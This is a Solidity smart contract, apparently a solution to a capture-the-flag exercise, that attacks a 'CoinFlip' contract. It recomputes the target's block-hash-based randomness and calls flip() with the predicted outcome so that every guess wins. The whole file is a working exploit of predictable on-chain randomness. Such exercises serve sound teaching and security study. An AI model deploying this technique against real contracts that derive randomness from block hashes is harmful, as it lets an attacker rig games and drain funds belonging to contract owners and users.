// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlipInterface {
    function flip(bool _guess) external returns (bool);
}

contract BreakCoinFlip {
    // The address of the CoinFlip contract that we're targeting
    address public targetContract;
    // The value of the targetCantracts variable lastHash
    uint256 public targetLastHash;
    // The value of the FACTOR variable in the target contract
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    // Constructor
    constructor() {
        targetContract = address(0);
        targetLastHash = 0;
    }
    
    // Sets the target contract address
    function setTargetContract(address _target) public {
        targetContract = _target;
    }
    
    // Sets lastTargetHash to what would be stored on the target contract
    /// @param _blockNumber THe block with the most recent transaction where flip() was called on targetContract
    function setTargetLastHash(uint _blockNumber) public {
        targetLastHash = uint256(blockhash(_blockNumber - 1));
    }
    
    function winCoinFlip()  public {
        // Calculate the blockValue
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // Calculate what the result of the coin flip will be
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;
        // Call the contracts coinFlip() function
        CoinFlipInterface cf = CoinFlipInterface(targetContract);
        bool win = cf.flip(side);
        require(win == true, "Outcome was not predicted");
        // Update the targetLastHash
        targetLastHash = blockValue;
    }
}
